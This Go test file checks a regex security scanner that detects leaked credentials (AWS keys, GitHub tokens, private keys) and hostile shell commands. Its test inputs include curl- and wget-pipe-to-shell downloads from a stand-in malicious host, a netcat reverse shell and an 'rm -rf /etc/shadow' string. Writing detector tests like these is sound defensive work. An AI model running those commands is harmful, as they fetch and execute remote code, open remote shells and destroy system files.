package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Pipe to Shell in String (False Positive)",
			content:     "fmt.Println(\"Don't do this: curl | bash\")",
			wantFinding: "",
		},
		{
			name:        "Pipe to Shell in Comment (False Positive)",
			content:     "# This should not trigger: curl | bash",
			wantFinding: "",
		},
		{
			name:        "Dangerous Command in String (False Positive)",
			content:     "fmt.Println(\"rm -rf /etc/shadow\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key in String (Should Find)",
			content:     "key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}

func TestRegexScanner_Masking(t *testing.T) {
	scanner := NewRegexScanner()

	// Test internal masking logic directly if possible, or infer via Scan
	// We'll rely on Scan tests above, but maybe add a complex case here.
	// Note: We use # for comments as the scanner primarily targets shell/yaml/docker,
	// and generic // masking is risky for URLs.

	complexContent := `
	func main() {
		# curl | bash in comment
		cmd := "curl | bash" # in quote with inline comment
		real := "AKIAIOSFODNN7EXAMPLE"
	}
	`

	findings, _ := scanner.Scan(complexContent)
	foundPipe := false
	foundAWS := false

	for _, f := range findings {
		if f.Type == "Pipe to Shell" {
			foundPipe = true
		}
		if f.Type == "AWS Access Key" {
			foundAWS = true
		}
	}

	if foundPipe {
		t.Errorf("Found pipe to shell in safe context (comment or quote)")
	}
	if !foundAWS {
		t.Errorf("Failed to find AWS key in quote")
	}
}
